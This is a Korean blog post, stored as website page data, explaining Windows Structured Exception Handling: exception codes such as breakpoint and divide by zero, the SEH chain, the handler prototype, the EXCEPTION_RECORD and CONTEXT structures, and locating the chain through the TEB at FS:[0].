어셈블리 명령어로 <code class=\"language-text\">INT 3</code> 입니다.</li>\n<li>해당 명령어의 기계어 (IA32 Instruction) 형태는 <code class=\"language-text\">0xCC</code> 이다.</li>\n<li>CPU는 코드 실행 과정에서 어셈블리 명령어 INT3을 만나면 EXCPETION_BREAKPOINT 예외를 발생시킨다.</li>\n<li>디버거 상에서는 사용자 임시 BP (User Temporary Break Point)이기 때문에 화면 상에 표시하지 ㅇ낳는다.</li>\n<li>해당 Instuction이 0xcc로 변경된 것을 확인할려면 프로세스 덤프를 한후에 해당 주소에서 확인이 가능하다.</li>\n</ul>\n<h3 id=\"status_illegal_instruction-------dword---0xc000001dl\" style=\"position:relative;\"><a href=\"#status_illegal_instruction-------dword---0xc000001dl\" aria-label=\"status_illegal_instruction       dword   0xc000001dl permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>STATUS_ILLEGAL_INSTRUCTION       ((DWORD   )0xC000001DL)</h3>\n<ul>\n<li>CPU가 해석할 수 없는 Instuction을 만날 때 발생하는 예외이다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token number\">0FFF</span></code></pre></div>\n<ul>\n<li>해당 Insturction은 x86 CPU에 정의된 Instruction이 아니기 때문에 EXCEPTION_ILLEGAL_INSTRUCTION 예외를 발생시킨다.</li>\n</ul>\n<h3 id=\"status_integer_divide_by_zero----dword---0xc0000094l\" style=\"position:relative;\"><a href=\"#status_integer_divide_by_zero----dword---0xc0000094l\" aria-label=\"status_integer_divide_by_zero    dword   0xc0000094l permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>STATUS_INTEGER_DIVIDE_BY_ZERO    (DWORD   )0xC0000094L</h3>\n<ul>\n<li>INTEGER (정수) 나눗셈 연산에서 분모가 0인 경우 (0으로나누는 경우) 발생하는 예외이다.</li>\n<li>프로그램 개발할 때 간혹 발생하는 예외</li>\n<li>분모가 변수로 잡혀 값이 0이 되었을 때 나누기 연산을 수행하면 EXCEPTION_INTEGER_DIVIDE_BY_ZERO 예외가 발생한다.</li>\n</ul>\n<h2 id=\"seh-chain\" style=\"position:relative;\"><a href=\"#seh-chain\" aria-label=\"seh chain permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SEH Chain</h2>\n<ul>\n<li>체인 형태로 구성되어 있다.</li>\n<li>첫 번째 에외 처리기에서 해당 예외를 처리하지 못하면 (처리될 때 까지) 다음 예외 처리기로 예외를 넘겨주는 형식이다.</li>\n<li>기술적으로 SEH는 EXCEPTION_REGISTRATION_RECORD 구조체 연결 리스트의 형태로 구성된다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_EXCEPTION_REGISTRATION_RECORD</span>\n<span class=\"token punctuation\">{</span>\n     PEXCEPTION_REGISTRATION_RECORD Next<span class=\"token punctuation\">;</span>\n     PEXCEPTION_DISPOSITION Handler<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> EXCEPTION_REGISTRATION_RECORD<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>PEXCEPTION_REGISTRATION_RECORD<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>Next 멤버는 다음 <em>EXCPETION</em>REGISTRATION_RECORD 구조체 포인터이며, Handler 멤버가 예외처리기 함수 (예외 처리기)이다.</li>\n<li>NEXT 멤버의 값이 <code class=\"language-text\">FFFFFFFF</code> 이면 연결리스트의 마지막을 나타낸다.</li>\n<li>프로세스의 SEH 체인 구조를 그림으로 표현하면</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAACWElEQVQoz12SW0+SARjH+R615QHl9HKQFxAFBEGQk5knQM1whivBqRvlpOnqI3RVeZjoctZWy9Q3oKWyVold+C26q1ldtbn1/hqUN1082/95fs//f/M8Cp1GL2uVKjRKlaxRqqhqQTDhD4QJ+EMEPD6CXj9+j5dubxcBfxB/dxijUeTvvpoLn1YtoLCF+nDOLMruzAId0zmcmQXMjk4ErR6rN4Rz+h7uWuVwzSxi8UcRNHpEeweOqXlc0zk8mRzO2SVaexMo3LNTcs9pgbGKJA9V9oh8eEVb7zW0DWraEjGin14zciKRON4j+nkf1+QEugYN1k4f4fIL4icS14/3iZ4W8C7dReG6PUXkoEi8KDFQkghJO9jCPajrmrAPxggXdhkqSQwVJcJvJdqT46jrmxDdPoK7L+kvScQL+0SOSrjvVANvjXP13QajhTzxYp7I3jK2cAh1vQr7QB890irDhTwjhTw9xXUcN4ZrTHR7iOw8JlbMM/omT+/BJp5sGoXOaKHJIKI0mFHqzTQbLQgGsXYYnUGs9UqDSKO+hWaDpTarMsFgRlVlenONVzO0RguK9IhfrqyPc7iSkssrExw9GiXc5eSKUqA/1EH5yRjl1RSHyxN8XEuSivmoU+px2O0UHiZ4v5biYPkmlfUkD9JRFPeTUc6fzchfn2b5vpXlbCPNYMDDpUYdyaiXH5sZzrayfNvK8mt7lvmRIJcbBTzt7XxZnuTndpaq9/z5HKtzgyjMJutve0srdpNVtpusVHX1x7SCCaPRwj/GBWsxWmpMbzDT+h8TTTb+AFSYdO5NBUyxAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./SEH_CHAIN.png\"\n        title=\"./SEH_CHAIN.png\"\n        src=\"/static/8f877b3c5b5fdbd859a60c8bb7f0ccf3/37523/SEH_CHAIN.png\"\n        srcset=\"/static/8f877b3c5b5fdbd859a60c8bb7f0ccf3/e9ff0/SEH_CHAIN.png 180w,\n/static/8f877b3c5b5fdbd859a60c8bb7f0ccf3/f21e7/SEH_CHAIN.png 360w,\n/static/8f877b3c5b5fdbd859a60c8bb7f0ccf3/37523/SEH_CHAIN.png 720w,\n/static/8f877b3c5b5fdbd859a60c8bb7f0ccf3/302a4/SEH_CHAIN.png 1080w,\n/static/8f877b3c5b5fdbd859a60c8bb7f0ccf3/07a9c/SEH_CHAIN.png 1440w,\n/static/8f877b3c5b5fdbd859a60c8bb7f0ccf3/74e37/SEH_CHAIN.png 1732w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>총 3개의 SEH가 존재한다. 어떤 예외가 발생하면, 예외가 해결될 때까지 처리기 (A) → (B) → (C) 순서대로 예외 처리기가 호출된다.</li>\n</ul>\n<h2 id=\"seh-함수-정의\" style=\"position:relative;\"><a href=\"#seh-%ED%95%A8%EC%88%98-%EC%A0%95%EC%9D%98\" aria-label=\"seh 함수 정의 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SEH 함수 정의</h2>\n<ul>\n<li>EXCEPTION_DISPOSITION</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">EXCPETION_DISPOSITION <span class=\"token function\">_except_handler</span> <span class=\"token punctuation\">(</span>\n\tEXCEPTION_RECORD               <span class=\"token operator\">*</span>pRecord<span class=\"token punctuation\">,</span>\n\tEXCEPTION_REGISTRATION_RECORD  <span class=\"token operator\">*</span>pFrame\n\tCONTEXT                        <span class=\"token operator\">*</span>pContext<span class=\"token punctuation\">,</span>\n\tPVOID                           pValue\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>예외 처리기는 4개의 파라미터를 입력 받으며, EXCEPTION_DISPOSITION 이라는 열거형을 반환한다.</li>\n<li>해당 예외 처리 함수는 시스템에 의해서 호출되는 콜백 함수이다.</li>\n<li>입력 파라미터들에 예외와 관련된 정보가 저장되어 있다.</li>\n</ul>\n<p><strong>EXCEPTION_RECORD 구조체 정의</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_EXCEPTION_RECORD</span> <span class=\"token punctuation\">{</span>\n  DWORD                    ExceptionCode<span class=\"token punctuation\">;</span>                <span class=\"token comment\">// 예외 코드</span>\n  DWORD                    ExceptionFlags<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_EXCEPTION_RECORD</span> <span class=\"token operator\">*</span>ExceptionRecord<span class=\"token punctuation\">;</span>\n  PVOID                    ExceptionAddress<span class=\"token punctuation\">;</span>             <span class=\"token comment\">// 예외 발생 주소</span>\n  DWORD                    NumberParameters<span class=\"token punctuation\">;</span>\n  ULONG_PTR                ExceptionInformation<span class=\"token punctuation\">[</span>EXCEPTION_MAXIMUM_PARAMETERS<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> EXCEPTION_RECORD<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>ExceptionCode : 발생한 예외의 종류를 의미</li>\n<li>ExcpetionAddress : 예외가 발생한 코드 주소를 나타낸다.</li>\n</ul>\n<p><strong>CONTEXT 구조체 정의</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_CONTEXT</span> <span class=\"token punctuation\">{</span>\n  DWORD64 P1Home<span class=\"token punctuation\">;</span>\n  DWORD64 P2Home<span class=\"token punctuation\">;</span>\n  DWORD64 P3Home<span class=\"token punctuation\">;</span>\n  DWORD64 P4Home<span class=\"token punctuation\">;</span>\n  DWORD64 P5Home<span class=\"token punctuation\">;</span>\n  DWORD64 P6Home<span class=\"token punctuation\">;</span>\n  DWORD   ContextFlags<span class=\"token punctuation\">;</span>\n  DWORD   MxCsr<span class=\"token punctuation\">;</span>\n  WORD    SegCs<span class=\"token punctuation\">;</span>\n  WORD    SegDs<span class=\"token punctuation\">;</span>\n  WORD    SegEs<span class=\"token punctuation\">;</span>\n  WORD    SegFs<span class=\"token punctuation\">;</span>\n  WORD    SegGs<span class=\"token punctuation\">;</span>\n  WORD    SegSs<span class=\"token punctuation\">;</span>\n  DWORD   EFlags<span class=\"token punctuation\">;</span>\n  DWORD64 Dr0<span class=\"token punctuation\">;</span>\n  DWORD64 Dr1<span class=\"token punctuation\">;</span>\n  DWORD64 Dr2<span class=\"token punctuation\">;</span>\n  DWORD64 Dr3<span class=\"token punctuation\">;</span>\n  DWORD64 Dr6<span class=\"token punctuation\">;</span>\n  DWORD64 Dr7<span class=\"token punctuation\">;</span>\n  DWORD64 Rax<span class=\"token punctuation\">;</span>\n  DWORD64 Rcx<span class=\"token punctuation\">;</span>\n  DWORD64 Rdx<span class=\"token punctuation\">;</span>\n  DWORD64 Rbx<span class=\"token punctuation\">;</span>\n  DWORD64 Rsp<span class=\"token punctuation\">;</span>\n  DWORD64 Rbp<span class=\"token punctuation\">;</span>\n  DWORD64 Rsi<span class=\"token punctuation\">;</span>\n  DWORD64 Rdi<span class=\"token punctuation\">;</span>\n  DWORD64 R8<span class=\"token punctuation\">;</span>\n  DWORD64 R9<span class=\"token punctuation\">;</span>\n  DWORD64 R10<span class=\"token punctuation\">;</span>\n  DWORD64 R11<span class=\"token punctuation\">;</span>\n  DWORD64 R12<span class=\"token punctuation\">;</span>\n  DWORD64 R13<span class=\"token punctuation\">;</span>\n  DWORD64 R14<span class=\"token punctuation\">;</span>\n  DWORD64 R15<span class=\"token punctuation\">;</span>\n  DWORD64 Rip<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">union</span> <span class=\"token punctuation\">{</span>\n    XMM_SAVE_AREA32 FltSave<span class=\"token punctuation\">;</span>\n    NEON128         Q<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    ULONGLONG       D<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">{</span>\n      M128A Header<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      M128A Legacy<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      M128A Xmm0<span class=\"token punctuation\">;</span>\n      M128A Xmm1<span class=\"token punctuation\">;</span>\n      M128A Xmm2<span class=\"token punctuation\">;</span>\n      M128A Xmm3<span class=\"token punctuation\">;</span>\n      M128A Xmm4<span class=\"token punctuation\">;</span>\n      M128A Xmm5<span class=\"token punctuation\">;</span>\n      M128A Xmm6<span class=\"token punctuation\">;</span>\n      M128A Xmm7<span class=\"token punctuation\">;</span>\n      M128A Xmm8<span class=\"token punctuation\">;</span>\n      M128A Xmm9<span class=\"token punctuation\">;</span>\n      M128A Xmm10<span class=\"token punctuation\">;</span>\n      M128A Xmm11<span class=\"token punctuation\">;</span>\n      M128A Xmm12<span class=\"token punctuation\">;</span>\n      M128A Xmm13<span class=\"token punctuation\">;</span>\n      M128A Xmm14<span class=\"token punctuation\">;</span>\n      M128A Xmm15<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> DUMMYSTRUCTNAME<span class=\"token punctuation\">;</span>\n    DWORD           S<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> DUMMYUNIONNAME<span class=\"token punctuation\">;</span>\n  M128A   VectorRegister<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  DWORD64 VectorControl<span class=\"token punctuation\">;</span>\n  DWORD64 DebugControl<span class=\"token punctuation\">;</span>\n  DWORD64 LastBranchToRip<span class=\"token punctuation\">;</span>\n  DWORD64 LastBranchFromRip<span class=\"token punctuation\">;</span>\n  DWORD64 LastExceptionToRip<span class=\"token punctuation\">;</span>\n  DWORD64 LastExceptionFromRip<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> CONTEXT<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>PCONTEXT<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>CONTEXT 구조체는 CPU 레지스터 값을 백업하는 용도로 사용된다.</li>\n<li>CPU 레지스터 값을 백업하는 이유는 멀티 스레드(Multi-Thread) 환경 때문이다.</li>\n<li>스레드는 내부적으로 CONTEXT 구조체를 하나씩 가지고 있다.</li>\n<li>CPU가 다른 스레드를 실행하러 잠시 이동할 때 CPU 레지스터들의 값을 현재 스레드의 CONTEXT 구조체에 백업한다.</li>\n<li>그후 CPU가 다시 에전 스레드를 실행하러 오면 CONTEXT 구조체에 백업된 레지스터 값들을 실제 CPU 레지스터에 덮어쓴다.</li>\n<li>아까 실행이 멈춰졌던 코드 위치부터 실행을 다시 시작한다.</li>\n<li>OS는 멀티 스레드 환경에서 안전하게 스레드 단위별로 실행이 가능하다.</li>\n</ul>\n<h3 id=\"multi-thread\" style=\"position:relative;\"><a href=\"#multi-thread\" aria-label=\"multi thread permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Multi-Thread</h3>\n<ul>\n<li>\n<p>CPU의 시분할 (Time-Slicing) 방식</p>\n</li>\n<li>\n<p>CPU가 각 스레드를 차례대로 일정 시간 동안 실행해주는 것이다.</p>\n</li>\n<li>\n<p>그 시간 간격이 극히 짧기 때문에 동시에 여러 개의 스레드가 실행되는 것처럼 보이는 것이다.</p>\n</li>\n<li>\n<p>스레드의 우선순위에 따라서 CPU 제어권을 얻는 횟수에 차이가 발생한다.</p>\n</li>\n<li>\n<p>예외가 발생하면 그 코드를 실행한 스레드는 중지되고 SEH(예외 처리기)가 실행된다.</p>\n</li>\n<li>\n<p>OS는 예외 처리기의 파라미터에 해당 스레드의 CONTEXT 구조체 포인터를 넘겨준다.</p>\n</li>\n<li>\n<p>구조체 멤버 중 EIP 멤버가 있다.(offset: B8)</p>\n</li>\n<li>\n<p>예외 처리기에서 파라미터로 넘어온 CONTEXT.Eip 를 다른 주소로 설정한 후 예외 처리기 함수를 리턴시키면, 아까 중지된 스레드는 새로 설정된 EIP 주소의 코드를 실행한다.</p>\n</li>\n</ul>\n<h3 id=\"exception_disposition-enum\" style=\"position:relative;\"><a href=\"#exception_disposition-enum\" aria-label=\"exception_disposition enum permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>EXCEPTION_DISPOSITION enum</h3>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">enum</span> <span class=\"token class-name\">_EXCEPTION_DISPOSITION</span>\n<span class=\"token punctuation\">{</span>\n         ExceptionContinueExecution <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n         ExceptionContinueSearch <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n         ExceptionNestedException <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n         ExceptionCollidedUnwind <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\n<span class=\"token punctuation\">}</span> EXCEPTION_DISPOSITION<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>예외 처리기 (SEH)에서 예외를 처리했다면 <code class=\"language-text\">ExceptionContinueExecution(0)</code> 을 리턴할 경우 예외가 발생한 코드부터 재실행된다.</li>\n<li>만약 예외를 처리할 수 없다면 ExceptionContinueSearch(1)을 리턴하여 SEH chain에서 다음 예외 처리기에서 처리하도록 한다.</li>\n</ul>\n<h3 id=\"tebnttibexceptionlist\" style=\"position:relative;\"><a href=\"#tebnttibexceptionlist\" aria-label=\"tebnttibexceptionlist permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>TEB.NtTib.ExceptionList</h3>\n<ul>\n<li>프로세스의 SEH chain.에 접근하는 방법은 간단하다.</li>\n<li>TEB(THREAD ENVIRONMENT BLOCK) 구조체의 NtTib 멤버를 따라가면 된다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token number\">0</span><span class=\"token operator\">:</span><span class=\"token number\">003</span><span class=\"token operator\">></span> dt _NT_TIB\nntdll<span class=\"token operator\">!</span>_NT_TIB\n   <span class=\"token operator\">+</span><span class=\"token number\">0x000</span> ExceptionList    <span class=\"token operator\">:</span> Ptr32 _EXCEPTION_REGISTRATION_RECORD\n   <span class=\"token operator\">+</span><span class=\"token number\">0x004</span> StackBase        <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x008</span> StackLimit       <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x00c</span> SubSystemTib     <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x010</span> FiberData        <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x010</span> Version          <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x014</span> ArbitraryUserPointer <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x018</span> Self             <span class=\"token operator\">:</span> Ptr32 _NT_TIB</code></pre></div>\n<ul>\n<li>TEB 구조체에서 가장 첫 멤버임을 확인할 수 있다.</li>\n<li>TEB는 FS 세그먼트 레지스터가 가리키는 세그먼트 메모리의 시작 주소 (base address)에 위치한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">TEB<span class=\"token punctuation\">.</span>NtTib<span class=\"token punctuation\">.</span>ExceptionList <span class=\"token operator\">=</span> FS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></code></pre></div>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<ul>\n<li><a href=\"#seh-%EB%A7%A4%EC%BB%A4%EB%8B%88%EC%A6%98\">SEH 매커니즘</a></li>\n<li><a href=\"#%EC%9D%BC%EB%B0%98-%EC%8B%A4%ED%96%89%EC%9D%98-%EA%B2%BD%EC%9A%B0-%EC%98%88%EC%99%B8-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EB%B2%95\">일반 실행의 경우 예외 처리 방법</a></li>\n<li><a href=\"#%EB%94%94%EB%B2%84%EA%B9%85-%EC%8B%A4%ED%96%89%EC%9D%98-%EA%B2%BD%EC%9A%B0-%EC%98%88%EC%99%B8-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EB%B2%95\">디버깅 실행의 경우 예외 처리 방법</a></li>\n<li><a href=\"#%EB%94%94%EB%B2%84%EA%B1%B0-%EC%8B%A4%ED%96%89-%EC%A4%91%EC%A7%80%EC%8B%9C-%EC%A1%B0%EC%B9%98\">디버거 실행 중지시 조치</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#excpetion\">Excpetion</a></p>\n<ul>\n<li><a href=\"#status_access_violation--dword---0xc0000005l\">STATUS_ACCESS_VIOLATION  (DWORD   )0xC0000005L</a></li>\n<li><a href=\"#status_breakpoint-dword---0x80000003l\">STATUS_BREAKPOINT (DWORD   )0x80000003L</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#breakpoint-%EA%B5%AC%ED%98%84-%EB%B0%A9%EB%B2%95\">BreakPoint 구현 방법</a></p>\n<ul>\n<li><a href=\"#int-3\">INT 3</a></li>\n<li><a href=\"#status_illegal_instruction-------dword---0xc000001dl\">STATUS_ILLEGAL_INSTRUCTION       ((DWORD   )0xC000001DL)</a></li>\n<li><a href=\"#status_integer_divide_by_zero----dword---0xc0000094l\">STATUS_INTEGER_DIVIDE_BY_ZERO    (DWORD   )0xC0000094L</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#seh-chain\">SEH Chain</a></p>\n</li>\n<li>\n<p><a href=\"#seh-%ED%95%A8%EC%88%98-%EC%A0%95%EC%9D%98\">SEH 함수 정의</a></p>\n<ul>\n<li><a href=\"#multi-thread\">Multi-Thread</a></li>\n<li><a href=\"#exception_disposition-enum\">EXCEPTION_DISPOSITION enum</a></li>\n<li><a href=\"#tebnttibexceptionlist\">TEB.NtTib.ExceptionList</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"January 03, 2021","title":"Windows SEH (Structured Exception Handler) 0","categories":"Windows","author":"Zer0Luck","emoji":"🍙"},"fields":{"slug":"/window_3_theori/"}},"site":{"siteMetadata":{"siteUrl":"https://www.zoomkoding.com","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/window_4_theori/","nextSlug":"/cve_2012_0002_1-day/","prevSlug":"/window_3_theori/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}